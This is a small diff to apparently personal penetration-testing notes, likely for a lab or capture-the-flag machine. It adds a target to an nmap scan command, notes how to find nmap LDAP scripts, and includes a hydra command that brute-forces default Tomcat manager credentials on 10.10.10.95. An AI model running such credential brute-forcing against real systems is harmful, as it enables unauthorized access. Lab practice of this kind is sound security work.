@@ -1,4 +1,4 @@
-Nmap -sC -sV -oA export_path/filename
+Nmap -sC -sV -oA export_path/filename IP Address
   Locate -r nse$ | grep ldap (search Kali for NMAP scripts)
 
 HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -vV -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get  /manager/html
